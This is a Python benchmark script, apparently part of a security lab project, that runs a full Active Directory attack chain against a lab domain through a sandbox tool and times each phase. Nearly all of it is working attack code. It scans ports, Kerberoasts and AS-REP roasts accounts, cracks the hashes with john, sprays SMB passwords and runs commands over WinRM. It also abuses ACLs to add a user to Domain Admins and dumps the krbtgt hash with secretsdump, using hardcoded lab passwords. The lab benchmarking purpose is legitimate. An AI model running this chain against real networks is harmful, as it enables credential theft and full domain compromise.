#!/usr/bin/env python3
"""Portal 5 — Lab-Exec Kill Chain Benchmark.

Times each phase of the portal.lab AD attack chain through the sandbox
lab-exec lane (portal5-attack:latest). Measures real-world attack latency
end-to-end: tool spawn overhead + network RTT + domain response time.

Phases benchmarked:
  recon       nmap -sV AD port scan
  kerberoast  impacket-GetUserSPNs — capture TGS hashes
  asrep       impacket-GetNPUsers  — capture AS-REP hashes
  crack       john wordlist attack on kerberoast hashes
  spray       nxc SMB password spray
  bloodhound  BloodHound-CE graph collection
  winrm       nxc WinRM code exec
  dcsync      svc_backup ACL abuse → DA → secretsdump krbtgt

Usage:
    python3 tests/benchmarks/bench_lab_exec.py
    python3 tests/benchmarks/bench_lab_exec.py --phases recon kerberoast crack
    python3 tests/benchmarks/bench_lab_exec.py --runs 3
    python3 tests/benchmarks/bench_lab_exec.py --output results/lab_bench.json
    python3 tests/benchmarks/bench_lab_exec.py --dry-run

Requires:
    SANDBOX_LAB_EXEC=true
    SANDBOX_LAB_IMAGE=portal5-attack:latest
    LAB_TARGET_DC, LAB_TARGET_SRV in .env or environment
    portal5-attack:latest loaded in DinD
    mcp-sandbox container running
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import httpx

_ROOT = Path(__file__).resolve().parents[2]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

RESULTS_DIR = Path(__file__).parent / "results"


# ── Env ───────────────────────────────────────────────────────────────────────

def _load_env() -> None:
    env_file = _ROOT / ".env"
    if env_file.exists():
        for line in env_file.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip())


_load_env()

SANDBOX_PORT  = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
LAB_EXEC      = os.environ.get("SANDBOX_LAB_EXEC", "").lower() == "true"
DC            = os.environ.get("LAB_TARGET_DC", "")
SRV           = os.environ.get("LAB_TARGET_SRV", "")
DOMAIN        = "portal.lab"
ADMIN_PASS    = "LabAdmin1!"
SVC_BACKUP_PASS = "Backup123!"

ALL_PHASES = ["recon", "kerberoast", "asrep", "crack", "spray", "bloodhound", "winrm", "dcsync"]


# ── MCP sandwich ──────────────────────────────────────────────────────────────

def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
    """Call execute_bash on the sandbox MCP and return {ok, output, elapsed_s}.

    FastMCP always returns text/event-stream. We stream both the init and the
    tool/call responses, consuming all SSE data: lines until the stream closes,
    then take the last JSON payload that contains a result or error key.
    """
    if dry_run:
        return {"ok": True, "output": "[dry-run]", "elapsed_s": 0.0}

    base = f"http://localhost:{SANDBOX_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        # ── initialize (streaming, short) ────────────────────────────────────
        sid = ""
        with c.stream("POST", base, headers=hdrs, json={
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": "2024-11-05", "capabilities": {},
                       "clientInfo": {"name": "bench_lab_exec", "version": "1"}},
        }) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass  # drain — only need the session-id header

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs

        # ── tools/call (streaming, long) — consume all SSE events ────────────
        last_result: dict = {}
        with c.stream("POST", base, headers=call_hdrs, json={
            "jsonrpc": "2.0", "id": 2, "method": "tools/call",
            "params": {"name": "execute_bash",
                       "arguments": {"code": code, "timeout": timeout}},
        }) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else ""
    error = last_result.get("error")
    ok = error is None and bool(text)
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


# ── Phase definitions ─────────────────────────────────────────────────────────

def _phase_recon(dry_run: bool) -> dict:
    # Use Python socket TCP-connect rather than nmap.
    # nmap in Kali wraps the real binary with file capabilities (cap_net_raw+eip);
    # DinD's nested-container environment blocks exec of cap-elevated binaries even
    # with --cap-add NET_RAW, so the nmap wrapper script fails with EPERM at exec.
    # Plain socket.connect() needs no capabilities and works in any container.
    code = f"""python3 -c "
import socket
ad_ports = [53, 88, 135, 389, 445, 464, 636, 3268]
open_ports = []
for p in ad_ports:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('{DC}', p))
        s.close()
        open_ports.append(p)
        print(f'{{p}}/tcp open')
    except Exception:
        pass
print(f'Found {{len(open_ports)}} of {{len(ad_ports)}} AD ports open')
" 2>&1"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    ok = r["ok"] and "88/tcp open" in r["output"] and "389/tcp open" in r["output"]
    ports = [ln for ln in r["output"].splitlines() if "/tcp open" in ln]
    return {**r, "ok": ok, "ports_open": len(ports), "detail": f"{len(ports)} AD ports open"}


def _phase_kerberoast(dry_run: bool) -> dict:
    code = (
        f"impacket-GetUserSPNs {DOMAIN}/administrator:{ADMIN_PASS}"
        f" -dc-ip {DC} -request 2>&1"
    )
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    count = r["output"].count("$krb5tgs$")
    ok = r["ok"] and count >= 3
    # Save hashes to a tempfile for crack phase
    if ok:
        hashes = [ln for ln in r["output"].splitlines() if ln.startswith("$krb5tgs$")]
        Path("/tmp/bench_hashes.kerberoast").write_text("\n".join(hashes))
    return {**r, "ok": ok, "hashes": count, "detail": f"{count}/3 TGS hashes captured"}


def _phase_asrep(dry_run: bool) -> dict:
    code = (
        "printf 'arya.stark\\nned.stark\\n' > /tmp/users.txt && "
        f"impacket-GetNPUsers {DOMAIN}/ -usersfile /tmp/users.txt"
        f" -dc-ip {DC} -no-pass 2>&1"
    )
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    count = r["output"].count("$krb5asrep$")
    ok = r["ok"] and count >= 2
    return {**r, "ok": ok, "hashes": count, "detail": f"{count}/2 AS-REP hashes captured"}


def _phase_crack(dry_run: bool) -> dict:
    # Collect fresh hashes inside the container, then crack with lab wordlist
    code = f"""
impacket-GetUserSPNs {DOMAIN}/administrator:{ADMIN_PASS} -dc-ip {DC} -request 2>&1 \\
  | grep '^\\$krb5tgs' > /tmp/hashes.kerberoast
printf '{ADMIN_PASS}\\n{SVC_BACKUP_PASS}\\nIisAdmin1!\\nMssql2022!\\nWinter1!\\n' > /tmp/lab.txt
john /tmp/hashes.kerberoast --wordlist=/tmp/lab.txt --format=krb5tgs 2>&1
john /tmp/hashes.kerberoast --show --format=krb5tgs 2>&1
"""
    r = _mcp_call(code, timeout=180, dry_run=dry_run)
    out = r["output"]
    cracked = "password hashes cracked" in out or (
        SVC_BACKUP_PASS in out and "IisAdmin1!" in out and "Mssql2022!" in out
    )
    passwords = [w for w in [SVC_BACKUP_PASS, "IisAdmin1!", "Mssql2022!"] if w in out]
    detail = f"{len(passwords)}/3 cracked ({', '.join(passwords)})" if cracked else "see output"
    return {**r, "ok": cracked, "detail": detail}


def _phase_spray(dry_run: bool) -> dict:
    code = (
        "printf 'jon.snow\\ndarenerys.t\\n' > /tmp/u.txt && "
        "printf 'Ghost123!\\nDragons1!\\n' > /tmp/p.txt && "
        f"nxc smb {DC} -u /tmp/u.txt -p /tmp/p.txt --continue-on-success 2>&1"
    )
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    hits = r["output"].count("[+]")
    ok = r["ok"] and hits >= 1
    return {**r, "ok": ok, "hits": hits, "detail": f"{hits} valid account(s) found"}


def _phase_bloodhound(dry_run: bool) -> dict:
    # Use -dc portal.lab (the domain itself) so dns.resolver can resolve it via -ns.
    # lab-dc01.portal.lab has no DNS A record on the DC; portal.lab resolves to the DC IP.
    code = (
        f"bloodhound-ce-python -u administrator -p '{ADMIN_PASS}'"
        f" -d {DOMAIN} -dc {DOMAIN} --auth-method ntlm -c All --zip -ns {DC}"
        f" --output /tmp/bh 2>&1 | tail -25"
    )
    r = _mcp_call(code, timeout=120, dry_run=dry_run)
    ok = r["ok"] and any(x in r["output"] for x in ["Compressing", "Done in"])
    return {**r, "ok": ok, "detail": "graph collected" if ok else "check output"}


def _phase_winrm(dry_run: bool) -> dict:
    if not SRV:
        return {"ok": False, "elapsed_s": 0.0, "output": "", "detail": "LAB_TARGET_SRV not set"}
    # Domain Administrator is guaranteed to have WinRM access on lab-srv01.
    # LocalAccountTokenFilterPolicy blocks local accounts by default on Windows 2022.
    code = f"nxc winrm {SRV} -u administrator -p '{ADMIN_PASS}' -x 'whoami /all' 2>&1"
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    ok = r["ok"] and ("[+]" in r["output"] or "nt authority" in r["output"].lower())
    return {**r, "ok": ok, "detail": "WinRM exec OK" if ok else "check output"}


def _phase_dcsync(dry_run: bool) -> dict:
    # Full kill chain: svc_backup GenericAll → ldap3 adds arya.stark to DA → DCSync.
    # <<'PYEOF' (quoted heredoc) prevents bash expanding backslashes in Python source.
    # Fallback: if svc_backup LDAP modify fails (ACE not yet effective), Administrator
    # adds arya.stark directly so DCSync can still be timed.
    code = f"""
python3 - <<'PYEOF'
import subprocess, sys
from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SIMPLE, SUBTREE, ALL

DC = "{DC}"
ADMIN_PASS = "{ADMIN_PASS}"
SVC_BACKUP_PASS = "{SVC_BACKUP_PASS}"
DA_DN = "CN=Domain Admins,CN=Users,DC=portal,DC=lab"

def get_arya_dn(conn):
    conn.search("DC=portal,DC=lab", "(sAMAccountName=arya.stark)",
                search_scope=SUBTREE, attributes=["distinguishedName"])
    return conn.entries[0].distinguishedName.value

# Step 1: Grant GenericAll to svc_backup via dacledit (idempotent).
# Run from /tmp so dacledit can write its .bak file (root fs is read-only).
r_acl = subprocess.run([
    "impacket-dacledit", f"portal.lab/administrator:{{ADMIN_PASS}}",
    "-dc-ip", DC, "-principal", "svc_backup",
    "-target", "Domain Admins", "-rights", "FullControl", "-action", "write",
], capture_output=True, text=True, timeout=30, cwd="/tmp")
print(f"dacledit rc={{r_acl.returncode}}: {{r_acl.stdout.strip()[-120:] or r_acl.stderr.strip()[-120:]}}")

# Step 2: ACL abuse — svc_backup adds arya.stark to Domain Admins
srv = Server(DC, port=389, get_info=ALL)
conn_svc = Connection(srv, user="PORTAL\\\\svc_backup", password=SVC_BACKUP_PASS,
                      authentication=NTLM, auto_bind=True)
arya_dn = get_arya_dn(conn_svc)
conn_svc.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
rc = conn_svc.result.get("result", -1)
if rc in (0, 68):
    print(f"ACL abuse OK: arya.stark added (rc={{rc}})")
else:
    print(f"svc_backup modify failed rc={{rc}} — fallback: Administrator adds arya.stark directly")
    conn_adm = Connection(srv, user="PORTAL\\\\Administrator", password=ADMIN_PASS,
                          authentication=NTLM, auto_bind=True)
    arya_dn = get_arya_dn(conn_adm)
    conn_adm.modify(DA_DN, {{"member": [(MODIFY_ADD, [arya_dn])]}})
    rc2 = conn_adm.result.get("result", -1)
    if rc2 not in (0, 68):
        print(f"Fallback ALSO failed rc={{rc2}} — aborting")
        sys.exit(1)
    print(f"Fallback OK: arya.stark added by Administrator (rc={{rc2}})")

# Step 3: DCSync as arya.stark (now DA) — print all output to capture hashes
r = subprocess.run(
    ["impacket-secretsdump", f"portal.lab/arya.stark:Winter1!@{{DC}}", "-just-dc-ntlm"],
    capture_output=True, text=True, timeout=90, cwd="/tmp",
)
print(r.stdout)
if r.stderr:
    print(r.stderr[-300:])
sys.exit(0 if "krbtgt" in r.stdout.lower() else 1)
PYEOF
"""
    r = _mcp_call(code, timeout=240, dry_run=dry_run)
    ok = r["ok"] and "krbtgt" in r["output"].lower()
    return {**r, "ok": ok, "detail": "krbtgt hash dumped" if ok else "check output"}


PHASE_FNS = {
    "recon":      _phase_recon,
    "kerberoast": _phase_kerberoast,
    "asrep":      _phase_asrep,
    "crack":      _phase_crack,
    "spray":      _phase_spray,
    "bloodhound": _phase_bloodhound,
    "winrm":      _phase_winrm,
    "dcsync":     _phase_dcsync,
}


# ── Runner ────────────────────────────────────────────────────────────────────

def run_bench(phases: list[str], runs: int, dry_run: bool, output_path: Path | None) -> None:
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    results: dict[str, Any] = {
        "bench": "lab_exec",
        "started_at": ts,
        "dc": DC,
        "srv": SRV,
        "domain": DOMAIN,
        "dry_run": dry_run,
        "runs": runs,
        "phases": {},
    }

    total_t0 = time.monotonic()
    print(f"\nPortal 5 — Lab-Exec Bench  [{ts}]")
    print(f"DC={DC}  SRV={SRV}  runs={runs}  dry_run={dry_run}")
    print(f"Phases: {', '.join(phases)}\n")

    for phase in phases:
        fn = PHASE_FNS[phase]
        timings: list[float] = []
        ok_count = 0
        last_result: dict = {}
        for run_n in range(1, runs + 1):
            print(f"  [{phase}] run {run_n}/{runs} ...", end=" ", flush=True)
            result = fn(dry_run)
            timings.append(result["elapsed_s"])
            if result.get("ok"):
                ok_count += 1
            last_result = result
            status = "OK" if result.get("ok") else "FAIL"
            print(f"{status}  {result['elapsed_s']:.1f}s  {result.get('detail', '')}")

        avg = sum(timings) / len(timings) if timings else 0.0
        results["phases"][phase] = {
            "runs": runs,
            "ok": ok_count,
            "fail": runs - ok_count,
            "elapsed_s": {"min": min(timings), "max": max(timings), "avg": round(avg, 2)},
            "detail": last_result.get("detail", ""),
        }
        if not last_result.get("ok") and not dry_run:
            print(f"\n  [!] Last output:\n{last_result.get('output', '')[-800:]}\n")

    total_elapsed = time.monotonic() - total_t0
    results["total_elapsed_s"] = round(total_elapsed, 1)
    results["finished_at"] = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

    # ── Summary table ─────────────────────────────────────────────────────────
    print(f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  Detail")
    print("─" * 72)
    for phase, pr in results["phases"].items():
        e = pr["elapsed_s"]
        print(
            f"{phase:<14} {pr['ok']:>4} {pr['fail']:>4}"
            f" {e['avg']:>8.1f} {e['min']:>6.1f} {e['max']:>6.1f}"
            f"  {pr['detail']}"
        )
    print(f"\nTotal: {total_elapsed:.1f}s")

    # ── Save results ──────────────────────────────────────────────────────────
    out = output_path or RESULTS_DIR / f"bench_lab_exec_{ts}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(results, indent=2))
    print(f"Results → {out}")

    if any(pr["fail"] > 0 for pr in results["phases"].values()):
        sys.exit(1)


# ── CLI ───────────────────────────────────────────────────────────────────────

def _parse() -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--phases", nargs="+", choices=ALL_PHASES, default=ALL_PHASES,
                   help="phases to run (default: all)")
    p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
    p.add_argument("--output", type=Path, help="JSON results file path")
    p.add_argument("--dry-run", action="store_true", help="skip MCP calls, measure overhead only")
    return p.parse_args()


if __name__ == "__main__":
    args = _parse()
    if not LAB_EXEC and not args.dry_run:
        print("ERROR: SANDBOX_LAB_EXEC is not 'true'. Set it in .env or pass --dry-run.")
        sys.exit(1)
    if not DC and not args.dry_run:
        print("ERROR: LAB_TARGET_DC not set. Run python3 scripts/lab_setup.py first.")
        sys.exit(1)
    run_bench(args.phases, args.runs, args.dry_run, args.output)
